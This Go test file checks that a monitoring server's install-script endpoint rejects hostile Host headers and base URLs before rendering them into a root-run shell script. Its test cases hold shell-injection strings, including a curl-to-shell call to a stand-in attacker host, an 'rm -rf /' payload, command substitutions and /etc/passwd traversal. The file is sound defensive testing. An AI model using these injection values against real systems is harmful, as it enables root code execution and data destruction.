package router

import (
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
)

// The install script is fetched anonymously and piped into `sudo bash`, and the
// address it reports to is derived from request headers. Go's own Host
// validation (httpguts.ValidHostHeader) accepts the RFC 3986 sub-delims —
// including the single quote — so these tests are the guard that keeps a
// hostile Host from escaping the single-quoted shell literal it is rendered
// into. Loosening the patterns without updating these cases reopens a root RCE.
func TestValidAgentHost(t *testing.T) {
	cases := []struct {
		host string
		want bool
	}{
		// legitimate
		{"127.0.0.1:17000", true},
		{"n9e.example.com", true},
		{"n9e.example.com:17000", true},
		{"host-1.sub.example.com:8080", true},
		{"[::1]:17000", true},
		{"[fe80::1]", true},

		// shell metacharacters that Go's Host validation lets through
		{"evil.com';curl http://attacker/x|sh;'", false},
		{"evil.com'", false},
		{"a$(id)b", false},
		{"a`id`b", false},
		{"a&b", false},
		{"a;b", false},
		{"a|b", false},
		{"a b", false},
		{"a\tb", false},
		{"host\nrm -rf /", false},
		{"host\r\nX: y", false},

		// other rejects
		{"", false},
		{"user@host", false},
		{"host/../../etc/passwd", false},
		{"host%0aevil", false},
		{"[::1%25eth0]", false}, // RFC 6874 zone-id intentionally unsupported
		{strings.Repeat("a", 300), false},
	}

	for _, tc := range cases {
		if got := validAgentHost(tc.host); got != tc.want {
			t.Errorf("validAgentHost(%q) = %v, want %v", tc.host, got, tc.want)
		}
	}
}

func TestNormalizeBaseURL(t *testing.T) {
	cases := []struct {
		in   string
		want string // "" means expected to be rejected
	}{
		{"http://127.0.0.1:17000", "http://127.0.0.1:17000"},
		{"127.0.0.1:17000", "http://127.0.0.1:17000"},
		{"https://n9e.example.com/", "https://n9e.example.com"},
		{"https://n9e.example.com/n9e", "https://n9e.example.com/n9e"},
		{"http://[::1]:17000", "http://[::1]:17000"},
		{"  http://n9e.example.com  ", "http://n9e.example.com"},

		// query/fragment are dropped rather than carried into the script
		{"http://n9e.example.com?a=b", "http://n9e.example.com"},
		{"http://n9e.example.com#frag", "http://n9e.example.com"},

		// rejects
		{"", ""},
		{"ftp://n9e.example.com", ""},
		{"file:///etc/passwd", ""},
		{"javascript:alert(1)", ""},
		{"http://user:pass@n9e.example.com", ""},
		{"http://evil.com';id;'", ""},
		{"http://evil.com/$(id)", ""},
		{"http://evil.com/a b", ""},
		// An embedded newline is the dangerous case (it could start a new shell
		// command); surrounding whitespace is merely trimmed, which is why
		// "http://evil.com\n" below is accepted in its cleaned form.
		{"http://evil.com\nrm -rf /", ""},
		{"http://evil.com\n", "http://evil.com"},
	}

	for _, tc := range cases {
		got, ok := normalizeBaseURL(tc.in)
		if tc.want == "" {
			if ok {
				t.Errorf("normalizeBaseURL(%q) = %q, want rejected", tc.in, got)
			}
			continue
		}
		if !ok || got != tc.want {
			t.Errorf("normalizeBaseURL(%q) = %q,%v; want %q,true", tc.in, got, ok, tc.want)
		}
	}
}

// Whatever survives normalization must be safe to paste inside '...' in a shell
// script and to use as a sed replacement with '#' as the delimiter. Assert the
// character set directly, so a future pattern change that reintroduces a
// dangerous character fails here rather than in production.
func TestNormalizeBaseURLCharset(t *testing.T) {
	const allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_:/[]"

	inputs := []string{
		"http://127.0.0.1:17000", "n9e.example.com", "https://a-b.c.d:65535/sub_path",
		"http://[fe80::1]:17000", "evil.com';id;'", "a$(id)b", "a&b#c", "http://x/../y",
	}

	for _, in := range inputs {
		got, ok := normalizeBaseURL(in)
		if !ok {
			continue
		}
		if i := strings.IndexFunc(got, func(r rune) bool { return !strings.ContainsRune(allowed, r) }); i >= 0 {
			t.Errorf("normalizeBaseURL(%q) = %q contains disallowed character %q", in, got, got[i])
		}
	}
}

// Renders the real template through the real handler, so a template syntax
// error, a missing anti-caching header, or a validation regression fails here
// rather than in a release.
func TestCategrafInstallScript(t *testing.T) {
	gin.SetMode(gin.TestMode)
	rt := &Router{}

	cases := []struct {
		name string
		host string
		want string
	}{
		{"plain host", "10.1.2.3:17000", "DEFAULT_N9E_HOST='http://10.1.2.3:17000'"},
		{"domain", "n9e.example.com", "DEFAULT_N9E_HOST='http://n9e.example.com'"},
		// A hostile Host must not reach the script; with no usable site_url the
		// value renders empty and the script refuses to run without --server.
		{"shell injection", "evil.com';curl http://x|sh;'", "DEFAULT_N9E_HOST=''"},
	}

	for _, tc := range cases {
		w := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(w)
		c.Request = httptest.NewRequest("GET", "/api/n9e/agents/categraf/install.sh", nil)
		c.Request.Host = tc.host

		rt.categrafInstallScript(c)

		body := w.Body.String()
		if !strings.Contains(body, tc.want) {
			t.Errorf("%s: rendered script does not contain %q", tc.name, tc.want)
		}
		if !strings.Contains(w.Header().Get("Cache-Control"), "no-store") {
			t.Errorf("%s: install.sh must not be cacheable (body varies by Host)", tc.name)
		}
		if !strings.Contains(w.Header().Get("Vary"), "Host") {
			t.Errorf("%s: install.sh must Vary on Host", tc.name)
		}
		if w.Header().Get("Content-Length") != strconv.Itoa(len(body)) {
			t.Errorf("%s: install.sh must send a Content-Length so a truncated "+
				"transfer fails in curl instead of reaching bash", tc.name)
		}
	}
}

// The package is unpacked and run as root, so the address it is fetched from
// must not be reachable by anything a link can carry. ?host= moves the address
// categraf reports to and nothing else.
func TestCategrafInstallScriptDownloadBaseIgnoresHostParam(t *testing.T) {
	gin.SetMode(gin.TestMode)
	rt := &Router{}

	w := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(w)
	c.Request = httptest.NewRequest("GET",
		"/api/n9e/agents/categraf/install.sh?host=attacker.example.com", nil)
	c.Request.Host = "n9e.internal:17000"

	rt.categrafInstallScript(c)

	body := w.Body.String()
	if !strings.Contains(body, "DEFAULT_N9E_HOST='http://attacker.example.com'") {
		t.Error("?host= should set the reported address")
	}
	if !strings.Contains(body, "DOWNLOAD_BASE='http://n9e.internal:17000'") {
		t.Error("?host= must NOT redirect the download source; that is a root RCE vector")
	}
}

// A bad ?host= is rejected outright rather than silently replaced by the
// request Host: the script would otherwise bake in an address the user never
// asked for, and categraf reports nowhere while looking perfectly healthy.
func TestN9EBaseURLRejectsInvalidHostParam(t *testing.T) {
	gin.SetMode(gin.TestMode)
	rt := &Router{}

	c, _ := gin.CreateTestContext(httptest.NewRecorder())
	c.Request = httptest.NewRequest("GET",
		"/api/n9e/agents/categraf/meta?host="+url.QueryEscape("evil.com';id;'"), nil)
	c.Request.Host = "n9e.internal:17000"

	defer func() {
		if recover() == nil {
			t.Error("an invalid ?host= must abort the request, not fall back to Host")
		}
	}()
	rt.n9eBaseURL(c)
}
